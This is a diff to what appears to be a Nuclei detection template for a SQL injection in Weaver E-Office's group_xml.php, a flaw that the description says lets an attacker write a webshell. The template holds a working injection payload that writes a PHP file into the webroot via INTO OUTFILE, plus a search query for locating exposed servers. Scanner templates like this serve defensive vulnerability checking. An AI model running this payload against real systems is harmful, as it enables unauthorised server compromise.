@@ -3,7 +3,7 @@ http:
   - part: body_2
     type: word
     words:
-    - 758058d8987e7a9ec723bcdbec6c407e
+    - '{{md5(string)}}'
   - status:
     - 200
     type: status
@@ -24,6 +24,8 @@ http:
 id: weaver-group-xml-sqli
 info:
   author: SleepingBag945
+  classification:
+    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
   description: 'There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php
     file. Through the vulnerability, an attacker can write to the Webshell file to
     obtain server permissions.
@@ -32,6 +34,8 @@ info:
   metadata:
     fofa-query: "app=\"\u6CDB\u5FAE-EOffice\""
     max-request: 2
+    product: e-office
+    vendor: weaver
     verified: true
   name: OA E-Office group_xml.php - SQL Injection
   reference:
@@ -39,8 +43,9 @@ info:
     \u5165\u6F0F\u6D1E.html"
   - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20group_xml.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
   severity: critical
-  tags: weaver,e-office,oa,sqli
+  tags: weaver,e-office,oa,sqli,vuln
 variables:
   filename: '{{to_lower(rand_base(5))}}'
-  payload: '[group]:[1]|[groupid]:[1 union select ''<?php echo md5(weaver);?>'',2,3,4,5,6,7,8
+  payload: '[group]:[1]|[groupid]:[1 union select ''<?php echo md5("{{string}}");unlink(__FILE__);?>'',2,3,4,5,6,7,8
     into outfile ''../webroot/{{filename}}.php'']'
+  string: weaver-group-xml-sqli
